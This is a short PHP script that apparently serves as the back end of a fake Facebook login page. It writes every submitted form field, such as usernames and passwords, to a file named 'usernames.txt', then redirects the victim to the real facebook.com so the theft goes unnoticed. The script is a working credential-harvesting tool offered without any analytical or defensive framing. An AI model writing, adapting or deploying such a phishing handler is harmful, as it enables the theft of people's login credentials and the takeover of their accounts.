<?php
header
('location');
$handel=fopen("usernames.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handel,$variable);
fwrite($handel,"=");
fwrite($handel,$value);
fwrite($handel,"\r\n");
}
fwrite($handel,"\r\n");
fclose($handel);
header("location:https://facebook.com");
exit;
?>
